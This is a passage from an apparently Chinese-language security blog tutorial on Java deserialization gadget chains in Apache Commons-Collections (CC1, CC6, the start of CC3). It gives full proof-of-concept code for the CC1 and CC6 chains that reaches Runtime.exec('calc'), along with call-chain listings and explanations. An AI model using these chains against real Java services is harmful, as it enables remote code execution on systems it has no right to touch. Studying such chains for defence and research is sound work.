class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>实际是个代理类，它实现了<code>InvocationHandler</code>接口。</p><p>我们只需要完成：</p><ol><li><code>readObject</code>中调用任意方法，调用者是<code>AnnotationInvocationHandler</code>代理对象</li><li><code>AnnotationInvocationHandler</code>的<code>invoke</code>触发<code>memberValues.get()</code> ，因此代理对象的<code>memberValues</code>要设为<code>LazyMap</code></li><li><code>LazyMap#get</code>触发<code>factory.transform()</code></li></ol><p>那么POC也就呼之欲出了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(argMap, chainedTransformer);<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, evilMap);<br>    <span class="hljs-comment">// 代理对象proxyMap</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>    oos.writeObject(handler);<br>    oos.close();<br><br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>POC中触发<code>invoke</code>的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject =&gt; memberValues.entrySet()<br></code></pre></td></tr></table></figure><p>因此<code>Proxy.newProxyInstance</code>传的是<code>Map</code>的<code>ClassLoader</code>和接口</p><p>但是，<code>LazyMap</code>的漏洞触发在get和invoke中 而<code>TransformedMap</code>的漏洞触发在setValue中 </p><p>同样在 <strong>Jdk8u71</strong>之后，由于<code>AnnotationInvocationHandler</code>不再直接使用反序列化得到的Map对象，而是新建了一个<code>LinkedHashMap</code>对象，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象。 因此CC1链只局限在<strong>Jdk8u71</strong>之前的版本。所以这里弹不出calc，但是原理是这么个原理。</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>为什么不按顺序来，确实因为CC2的特点跟前面CC1接不上，但是CC6可以顺延往下讲，上面说到<strong>Jdk8u71</strong>引入的<code>LinkedHashMap</code>让CC1失效，而CC6克服了这一点，脱胎于CC1，成为Java8系列常见的原生链。</p><p>CC6链子后半段还是使用CC1的<code>LazyMap</code>，由于<code>AnnotationInvocationHandler</code>因Java版本而利用受限，需要找寻其他可以调用<code>LazyMap#get</code>的地方。</p><p>这里又要引入一个完美解决这个问题的类了，接下来赶到战场的是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.keyvalue.TiedMapEntry<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>显而易见的是<code>getValue</code>部分调用了<code>get</code>方法，那么就有链子：</p><p><code>hashCode()</code> &#x3D;&gt; <code>getValue()</code> &#x3D;&gt; <code>map.get(key)</code></p><p>hashCode是在URLDNS中也用到的，作为一个访问DNS的触发器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashMap#readObject</span><br><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#hash</span><br><span class="hljs-comment">// 调用hash是为保证键的唯一性</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#put</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以得到一个链：</p><p><code>readObject()</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code></p><p>所以我们就能得出，在这里让<strong>key &#x3D;&#x3D; TiedMapEntry对象</strong>，就能完美连接起来前面的链子了。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>HashSet#readObject()<br>HashMap#put()<br>HashMap#hash()<br>TiedMapEntry#hashCode()<br>TiedMapEntry#getValue()<br>LazyMap#get()<br>                                <span class="hljs-comment">//恶意对象反射链部分</span><br>      ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>初代目：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">// fake_payload</span><br>Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>    <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// put的时候也会执行hashCode，为了防止本地调试触发payload，这里放入fake_payload</span><br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br><span class="hljs-comment">// 将真正的transformers数组设置进来</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(expMap);<br>oos.close();<br><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p>但是这个是没办法直接反序列化的。</p><p>当我们执行<code>Map.put()</code>的时候会触发<code>hash()</code>，进而牵动整条链。</p><p>再来看<code>LazyMap</code>的<code>get()</code>，由于是懒加载因此得到当前map中没有key，才会满足那个if条件再调用到<code>factory.transform(key)</code>生成value，再<code>map.put(key, value)</code>，这时候<code>lazyMap</code>中就有key了。（这里的key是<code>new TiedMapEntry</code>传入的key）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap#get</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>解决方法也很简单，只需要想办法把这个键值对从<code>LazyMap</code>中移除就行，即<code>lazyMap.remove(&quot;test&quot;);</code></p><p>Final CC6-POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728211545706.png" alt="image-20240728211545706"></p><p>划时代的意义。</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC4涉及到更新的Commons-Collections4，所以留到后面讲，而CC3同样具有划时代的意义，因为它的逻辑用到的是恶意字节码，这对于Java反序列化来说是个很常见的Attack方式。</p><p>首先需要介绍的是Java动态加载字节码的东西。</p><p>你可能会看到很多次 <code>Gadgets.createTemplatesImpl(command)</code> ，另外你也许曾在<code>fastjson</code>等漏洞的利用中看到过<code>TemplatesImpl</code>这个类，它究竟是什么，为何出镜率这么高呢？</p><p>字节码是什么就不做过多说明，这与Java作为静态语言而且能够“一次编译，到处运行”的宗旨有关。</p><p>加载字节码的方式也很多，这里先不介绍了，后面会单开一章来讲讲。</p><p>言归正传，CC3这里的背景是一个Question，CC1和CC6的sink都在<code>InvokerTransformer</code>上，若WAF直接禁用了该类，是否就拿它没法了？</p><p>当然不是。但这里就又要请出另一个解决这个问题的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<br></code></pre></td></tr></table></figure><p><strong>“我打宿傩？真的假的？”</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先分析一下这个<code>TrAXFilter</code>。</p><p>该类构造方法中调用了<code>(TransformerImpl) templates.newTransformer()</code></p><p><code>TransformerImpl</code>在加载字节码的很多文章那里提过，<code>newTransformer</code>最后能调用到<code>defineClass()</code>加载恶意字节码。</p><p>但是目前看来如果没有<code>InvokerTransfomer</code>，<code>TrAXFilter</code>的构造方法也无法调用</p><p>这里要用到新的<code>Transformer</code>实现类<code>InstantiateTransformer</code>，看看它的<code>transform</code>，它的作用就是调用构造函数，返回类实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>    <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>    <span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>ChainedTransformer#transform()<br>InstantiateTransformer#transform()<br>    TrAXFilter#TrAXFilter()<br>TemplatesImpl#newTransformer()<br>TemplatesImpl#getTransletInstance()<br>TemplatesImpl#defineTransletClasses()<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>这里需要用到<code>javassist</code>来获取字节码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span 